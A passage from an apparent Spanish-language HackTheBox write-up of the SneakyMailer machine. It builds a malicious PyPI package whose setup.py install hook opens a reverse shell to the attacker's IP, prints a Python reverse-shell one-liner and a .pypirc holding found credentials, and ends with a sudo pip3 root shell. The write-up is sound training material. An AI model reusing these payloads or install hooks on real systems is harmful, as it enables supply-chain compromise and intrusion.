* [Python PyPI Challenges](https://attackdefense.com/listingnoauth?labtype=code-repos&subtype=code-repos-pypi).
* [Articulo de un investigador que ha encontrado varios paquetes maliciosos sobre PyPI](https://medium.com/@bertusk/detecting-cyber-attacks-in-the-python-package-index-pypi-61ab2b585c67).

...

Esta máquina me desquicio, pero fue muy divertida e interesante... Acá me estanque fuertemente, ya que el proceso de crear el paquete "malicioso" (que llamaremos **pycod3ate**) estaba siendo algo difícil de entender... Además me estaba complicando de más:

Siguiendo esta guía, genere la estructura inicial.

* [Packaging tutorial python.org](https://packaging.python.org/tutorials/packaging-projects/).

Primero monte todo en mi máquina y cuando ya posiblemente tuviera todo bien lo pasaría a la máquina víctima.

Lo importante será crear nuestro `setup.py` que será el que contendrá la información del paquete que subiremos, pero además tendrá el código malicioso, así cuando en la máquina víctima le indiquemos que ejecute el `setup.py` ejecutara de paso nuestro payload :)

De manera sencilla podemos decirle al script que nos genere una reverse Shell (que si traemos el recuerdo de los mails, sabemos que las tareas sobre paquetes son llevadas a cabo por `low`, por lo tanto obtendremos una sesión como el), yo tome la clásica de Python:

* [Reverse shells cheat sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Entonces dentro de la clase que se ejecutara pondremos:

```py
import socket, subprocess, os

from setuptools import setup
from setuptools.command.install import install

class TotallyInnocentClass(install):
    def run(self):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.15.86",4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["/bin/sh","-i"]);

        install.run(self)

setup(
    name="pycod3ate",
    version="0.0.5",
    author="exeTera",
    author_email="hor@exe.com",
    description="Killing me",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    cmdclass={
        'install': TotallyInnocentClass
    }
)
```

Para la estructura y entendimiento me base en estos paquetes:

* [Ayrx + malicious-python-package](https://github.com/Ayrx/malicious-python-package/blob/master/setup.py).
* [mschwager + 0wned-package](https://github.com/mschwager/0wned/blob/master/setup.py).

Teniendo nuestro código malicioso lo que nos queda es ejecutarlo desde la máquina víctima, ponernos en escucha y obtener la reverse Shell por el puerto **4444**. Para ello usamos:

```bash
–» python3 setup.py sdist
```

El cual nos genera el siguiente árbol de objetos.

```bash
–» tree -a
.
├── dist
│   └── pycod3ate-0.0.5.tar.gz
├── LICENSE
├── pycod3ate
│   ├── __init__.py
│   └── __init__.pyc
├── pycod3ate.egg-info
│   ├── dependency_links.txt
│   ├── PKG-INFO
│   ├── SOURCES.txt
│   └── top_level.txt
├── README.md
└── setup.py
```

En este punto cuando subía `setup.py` a la máquina e intentaba ejecutarlo no pasaba nada, se creaban los archivos y parecía que todo iba bien pero no obtenía ningún output en la reverse Shell... Me queme un poco y de nuevo recurrí a `TazWake`

Me indico que lo óptimo es crear un archivo `.pypirc` el cual contenga unas credenciales (las de **pypi** que ya encontramos) y un repositorio al cual se van a subir los objetos, así `setup.py` sabe a donde apuntar, este sería nuestro archivo `.pypirc` (que debe ser alojado en el `$HOME`).

```bash
–» cat .pypirc 
[distutils]
index-servers =
    locuras

[locuras]
repository: http://pypi.sneakycorp.htb:8080/
username: pypi
password: soufianeelhaoui
```

Y en nuestra ejecución anterior agregaremos:

```bash
–» python3 setup.py sdist register -r locuras upload -r locuras
```

Vamos a la máquina víctima, subimos el nuevo `setup.py`, subimos `.pypirc`, indiquémosle que tome el index **locuras** e intentemos conseguir la reverse Shell :)

:( Obtenemos este error:

```bash
...
  File "/usr/lib/python3.7/distutils/command/register.py", line 80, in _set_config
    raise ValueError('%s not found in .pypirc' % self.repository)
ValueError: locuras not found in .pypirc
```

Como sabemos el archivo debe estar en la ruta `$HOME`, validemos que ruta tenemos y si podemos escribir sobre ella

```bash
developer@sneakymailer:/dev/shm$ echo $HOME
echo $HOME
/var/www/dev.sneakycorp.htb
developer@sneakymailer:/dev/shm$ cp .pypirc /var/www/dev.sneakycorp.htb
cp .pypirc /var/www/dev.sneakycorp.htb
cp: cannot create regular file '/var/www/dev.sneakycorp.htb/.pypirc': Permission denied
developer@sneakymailer:/dev/shm$ 
```

Pues no, no tenemos permiso, juguemos con las variables del entorno y digámosle que tome `/dev/shm` como `$HOME` por un momento y después lo dejamos como estaba :P

```bash
developer@sneakymailer:/dev/shm$ ORIGINALhome=$HOME
ORIGINALhome=$HOME
developer@sneakymailer:/dev/shm$ echo $ORIGINALhome
echo $ORIGINALhome
/var/www/dev.sneakycorp.htb
developer@sneakymailer:/dev/shm$ export HOME=/dev/shm
export HOME=/dev/shm
developer@sneakymailer:~$ echo $HOME
echo $HOME
/dev/shm
developer@sneakymailer:~$ 
```

Listo, ejecutemos y veamos:

```bash
–» python3 setup.py sdist register -r locuras upload -r locuras
```

![bashrevshlow](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bashrevshlow.png)

SI SEÑOOOOOOOR!!! Obtenemos nuestra reverse Shell, que maravilla y que locura... (Estuve mis buenos días dándole a esto) 
Dejamos la variable `$HOME` como estaba:

```bash
developer@sneakymailer:~$ echo $HOME
echo $HOME
/dev/shm
developer@sneakymailer:~$ export HOME=$ORIGINALhome
export HOME=$ORIGINALhome
developer@sneakymailer:/dev/shm$ echo $HOME
echo $HOME
/var/www/dev.sneakycorp.htb
developer@sneakymailer:/dev/shm$ 
```

Algunos recursos útiles en el proceso:

* [https://dzone.com/articles/executable-package-pip-install](https://dzone.com/articles/executable-package-pip-install).
* [https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794](https://gist.github.com/wjladams/f00d6c590a4384ad2a92bf9c53f6b794).
* [https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56](https://medium.com/@joel.barmettler/how-to-upload-your-python-package-to-pypi-65edc5fe9c56).
* [https://packaging.python.org/tutorials/packaging-projects/](https://packaging.python.org/tutorials/packaging-projects/).
* [https://docs.python.org/3.3/distutils/packageindex.html](https://docs.python.org/3.3/distutils/packageindex.html).
* [https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html](https://the-hitchhikers-guide-to-packaging.readthedocs.io/en/latest/contributing.html).
* [https://packaging.python.org/specifications/pypirc/](https://packaging.python.org/specifications/pypirc/).

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Si vemos que puede ejecutar `low` como `root` mediante **sudo** vemos `pip3` y que no nos pedirá contraseña.

```bash
low@sneakymailer:~$ sudo -l
sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
low@sneakymailer:~$ 
```

Si hacemos una búsqueda rápida en internet, podemos conseguir una Shell indicándole a `pip3` que instale un paquete temporal, el cual simplemente hace eso, darnos una Shell, pero como el binario puede ser ejecutado con permisos de administrador, usaremos eso para obtener una sesión como el usuario administrador :)

* [Info de como conseguir la Shell mediante pip](https://gtfobins.github.io/gtfobins/pip/).

```bash
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo usr/bin/pip3 install $TF
```

Yyyyyy...

![bashpip3shellroot](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/bashpip3shellroot.png)

Obtenemos la Shell como administrador, veamos las flags :)

![flagSneakymailer](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sneakymailer/flagSneakymailer.png)

...

Y eso es todo para esta máquina...

Muy enredada, poquito de locura pero se disfrutó, entendimos como son manejados los paquetes en python (PyPI) y jugamos un poco con "phishing" al inicio. Claramente la parte más desafiante fue la creación y ejecución del paquete pero de eso se trata, aprender y romperse la cabeza un poquito y lo más importante, nunca rendirse :)

La escalada quizás fue hecha para compensar el peso del inicio y la obtención del usuario. De igual forma es superinteresante ver que con 3 líneas ya eres administrador :P

Muchas gracias por leer y a romper todo, que pases un feliz y lindo día/noche/ninguna :P